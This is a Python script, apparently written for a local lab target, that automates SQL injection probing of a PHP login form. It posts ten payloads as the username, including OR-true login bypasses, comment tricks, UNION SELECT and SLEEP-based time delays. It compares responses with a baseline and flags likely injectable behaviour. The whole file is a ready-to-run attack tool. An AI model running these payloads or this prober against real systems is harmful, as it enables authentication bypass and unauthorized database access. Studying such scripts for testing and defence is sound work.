import requests
import time
import sys

target_url = "http://127.0.0.1:33131/index.php"

# Streamlined payload list focusing on most likely to work
payloads = [
    ("admin' OR '1'='1'-- ", "boolean_true", "OR condition"),
    ("admin' #", "bypass", "Hash comment"),
    ("' OR SLEEP(5)-- ", "time_based", "Time-based"),
    ("' OR '1'='1'-- ", "boolean_true", "OR true"),
    ("admin'-- ", "bypass", "Comment bypass"),
    ("' UNION SELECT 1,2,3-- ", "union", "Union select"),
    ("' OR 1=1#", "boolean_true", "OR 1=1"),
    ("' OR IF(1=1,SLEEP(3),0)-- ", "time_based", "IF with SLEEP"),
    ("') OR '1'='1'-- ", "boolean_true", "Parentheses"),
    ("' AND '1'='2'-- ", "boolean_false", "AND false"),
]

print(f"[*] Testing {len(payloads)} payloads on {target_url}\n")

# Baseline
baseline_time = None
try:
    start = time.time()
    resp = requests.post(target_url, data={"username": "admin", "password": "wrong"}, timeout=10)
    baseline_time = time.time() - start
    baseline_status = resp.status_code
    baseline_len = len(resp.text)
    print(f"[*] Baseline: {baseline_status} | {baseline_time:.3f}s | {baseline_len}B\n")
except Exception as e:
    print(f"[!] Baseline failed: {e}\n")
    sys.exit(1)

# Test payloads
print(f"{'Payload':<50} {'Status':<6} {'Time':<8} {'Len':<6} {'Diff':<8}")
print("-" * 80)

found_anomalies = []

for payload, ptype, desc in payloads:
    try:
        start = time.time()
        resp = requests.post(target_url, data={"username": payload, "password": "test"}, timeout=15)
        elapsed = time.time() - start
        
        diff_time = elapsed - baseline_time
        diff_len = len(resp.text) - baseline_len
        
        anomaly = ""
        if elapsed > baseline_time + 2.0:
            anomaly = f"SLOW+{diff_time:.1f}s"
        elif abs(diff_len) > 10:
            anomaly = f"LEN{diff_len:+d}"
        elif resp.status_code != baseline_status:
            anomaly = f"CODE{resp.status_code}"
        
        if anomaly:
            print(f"[!] {payload[:48]:<50} {resp.status_code:<6} {elapsed:<8.3f} {len(resp.text):<6} {anomaly:<8}")
            found_anomalies.append({
                'payload': payload,
                'type': ptype,
                'status': resp.status_code,
                'time': elapsed,
                'baseline_time': baseline_time,
                'length': len(resp.text),
                'baseline_len': baseline_len,
                'anomaly': anomaly
            })
        else:
            print(f"[ ] {payload[:48]:<50} {resp.status_code:<6} {elapsed:<8.3f} {len(resp.text):<6} {'':<8}")
            
    except requests.exceptions.Timeout:
        print(f"[!] {payload[:48]:<50} TIMEOUT{'':<26}")
        found_anomalies.append({'payload': payload, 'status': 'TIMEOUT', 'type': ptype})
    except Exception as e:
        print(f"[!] {payload[:48]:<50} ERROR:{str(e)[:10]}")

print(f"\n[*] Testing complete")
print(f"[*] Anomalies found: {len(found_anomalies)}")

if found_anomalies:
    print("\n[!] ANOMALY DETAILS:")
    for a in found_anomalies:
        print(f"\n  Payload: {a['payload']}")
        print(f"  Type: {a['type']}")
        if 'status' in a and a['status'] != 'TIMEOUT':
            print(f"  Status: {a['status']} | Anomaly: {a.get('anomaly', 'Unknown')}")
            if 'time' in a and a['time'] > 5.0:
                print(f"  [!] HIGH CONFIDENCE: Time-based SQL injection detected!")
                print(f"      Response time: {a['time']:.3f}s vs baseline {a['baseline_time']:.3f}s")
        elif a['status'] == 'TIMEOUT':
            print(f"  [!] Request timed out - possible injection")

